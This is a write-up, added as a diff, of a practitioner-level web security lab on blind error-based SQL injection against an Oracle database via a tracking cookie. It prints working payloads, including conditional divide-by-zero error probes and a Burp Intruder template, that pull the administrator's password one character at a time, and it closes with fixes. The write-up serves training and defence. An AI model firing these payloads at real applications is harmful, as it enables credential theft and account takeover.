@@ -1,0 +1,77 @@
+Lab Difficulty: Practitioner
+Vulnerability: Blind SQL Injection (conditional errors) — Oracle-style
+
+Summary
+
+This lab has a blind SQLi in a tracking cookie. The app uses TrackingId from your cookie inside a SQL query. The query’s results aren’t shown and normal/true vs false conditions don’t change the page — but if the SQL errors, the app returns a custom error. So we can trigger an error conditionally and use that as a yes/no oracle to extract data (like the admin’s password). Neat and noisy, but works.
+
+Steps Taken
+
+Logged into the app and opened the shop front page. Let Burp intercept the request so I could tamper with the TrackingId cookie. Assume original cookie: TrackingId=xyz.
+
+Quick sanity checks with quotes:
+
+Sent TrackingId=xyz' → got an error.
+
+Sent TrackingId=xyz'' → error disappears.
+That told me quote handling matters (syntax error possible).
+
+Confirmed SQL injection context and DB type:
+
+Tried TrackingId=xyz'||(SELECT '')||' → still invalid.
+
+Tried TrackingId=xyz'||(SELECT '' FROM dual)||' → no error.
+Seeing dual behave this way means the backend is likely Oracle (Oracle requires FROM).
+
+Tried a query against a non-existent table:
+TrackingId=xyz'||(SELECT '' FROM not_a_real_table)||' → error.
+So our injection is being parsed as SQL.
+
+Verified we can trigger errors conditionally:
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' → error (divide-by-zero).
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' → no error.
+The CASE/TO_CHAR(1/0) trick gives us a conditional error oracle.
+
+Confirmed administrator exists:
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' → error.
+So there is a row where username='administrator'.
+
+Found password length (manual with Repeater):
+
+Sent queries like:
+TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>n THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+Incremented n until the error stopped. Determined password length = 20.
+
+Extracted password characters with Burp Intruder:
+
+Built a payload template to test each character at a given position:
+TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,<pos>,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+Set the §...§ marker around the character spot.
+
+Payload list: a–z and 0–9 (the lab hints lowercase alnum only).
+
+Launched Intruder for position 1, looked for the request that returned HTTP 500 (error). That payload is the correct character.
+
+Repeated for pos 2, pos 3, … pos 20 until the full password was recovered.
+
+Used the recovered password to log in as administrator via the My account / login page. Lab solved.
+
+Root Cause
+
+The app concatenates client-controlled data (the TrackingId cookie) into a SQL query without proper sanitization or parameterization. The DB is Oracle, and the app lets us inject expressions that can cause errors. Because the app reveals an error page on SQL exceptions, we can convert those errors into a boolean oracle and extract data one bit/character at a time.
+
+Fixes and Mitigation
+
+Use parameterized queries / prepared statements — never concatenate untrusted input into SQL.
+
+Validate and sanitize cookie values (whitelist acceptable formats) before using them.
+
+Don’t reveal SQL error details to the client. Handle DB errors server-side and show generic messages.
+
+Apply least privilege to DB accounts — app account should not have unnecessary access to sensitive tables.
+
+Consider WAF rules to detect this pattern (but don’t rely on WAF instead of fixing the code).
